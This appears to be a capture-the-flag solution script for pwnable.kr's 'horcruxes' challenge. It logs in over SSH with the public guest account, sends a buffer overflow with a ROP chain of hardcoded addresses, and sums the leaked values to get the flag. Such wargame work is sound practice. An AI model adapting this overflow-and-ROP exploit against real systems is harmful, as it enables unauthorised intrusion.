from pwn import *
import logging

logging.root.setLevel(logging.DEBUG)

NUM_OF_HORCRUXES = 7

MAX_INT = 2147483647
MIN_INT = -2147483648

context.arch='i386'
context.bits=32

# Addresses of functions
rop_chain = {
    "A": 0x0809fe4c,
    "B": 0x0809fe6b,
    "C": 0x0809fe8a,
    "D": 0x0809fea9,
    "E": 0x0809fec8,
    "F": 0x0809fee7,
    "G": 0x0809ff06,
    "ropme": 0x0809fffc
}

def parse_output(output) -> int:
    """
    Gets the sum of numbers from the sentences.
    """
    output_lines = list(filter(len, output))
    if len(output_lines) != NUM_OF_HORCRUXES:
        print("Input not good! Len is {}".format(len(output_lines)))

    # Take the address from the sentence
    addresses = [int(x.strip()[x.find("+") + 1:-1]) for x in output_lines]
    addresses = [addresses[-1]] + addresses[:NUM_OF_HORCRUXES-1]

    return sum(addresses)

def calculate_with_overflow(number) -> int:
    if number > MAX_INT:
        return MIN_INT + (number - MAX_INT) - 1
    if number < MIN_INT:
        return MAX_INT + (number - MIN_INT) + 1
    else:
        return number

buff_overflow = b"2"*0x78 + (b"3"*4).join([p32(x) for x in rop_chain.values()])

ssh_conn = ssh("horcruxes", "pwnable.kr", port=2222, password="guest")
prog = ssh_conn.connect_remote("localhost", 9032)

# Send grabage to get to `gets`
print(prog.recv().decode())
prog.sendline(b"1")

# BOF + ROP on gets() function
print(prog.recv().decode())
logging.debug("Sending BO string...")
logging.debug(buff_overflow)
prog.sendline(buff_overflow)

print(prog.recvline())

# Receive all outputs from all horcruxes
logging.debug("Receiving all horcruxes...")
output = list()
for idx in range(NUM_OF_HORCRUXES):
    output.append(prog.recvline().decode())
    print(output[-1])
prog.recv().decode()

# Another garbage again
prog.sendline(b"5")
print(prog.recv().decode())

# Calculate overflow and stuff
parsed = parse_output(output)
logging.debug(f"Sum before overflow: {parsed}")
numbers_sum = calculate_with_overflow(parsed)
while numbers_sum < MIN_INT or numbers_sum > MAX_INT:
    numbers_sum = calculate_with_overflow(numbers_sum) 
logging.debug(f"Sum after overflow: {numbers_sum}")
prog.sendline(str(numbers_sum).encode())

logging.info("TADA FLAG:")
logging.info(prog.recv().decode())
prog.close()
ssh_conn.close()